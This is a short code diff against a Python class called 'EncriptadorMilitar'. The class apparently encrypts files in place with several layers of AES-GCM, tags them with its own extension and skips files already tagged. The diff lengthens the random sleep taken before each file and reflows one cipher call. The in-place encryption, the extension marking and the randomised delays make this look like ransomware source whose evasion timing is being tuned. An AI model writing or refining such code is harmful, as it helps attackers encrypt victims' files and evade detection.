@@ -118,7 +118,7 @@ class EncriptadorMilitar:
     
     def encriptar(self, ruta):
         try:
-            time.sleep(random.uniform(0.5, 2))
+            time.sleep(random.uniform(1, 3))
             
             if not os.path.exists(ruta) or ruta.endswith(self.ext):
                 return False
@@ -165,7 +165,8 @@ class EncriptadorMilitar:
             if num_capas >= 5:
                 key_a1 = self._derive_key(file_master, b'aes1', b'layer3', 32)
                 nonce_a1 = self._derive_key(file_master, b'nonce3', b'layer3', 12)
-                cipher_a1 = self.crypto['Cipher'](self.crypto['algorithms'].AES(key_a1),
+                cipher_a1 = self.crypto['Cipher'](
+                    self.crypto['algorithms'].AES(key_a1),
                     self.crypto['modes'].GCM(nonce_a1),
                     backend=self.crypto['backend']
                 )
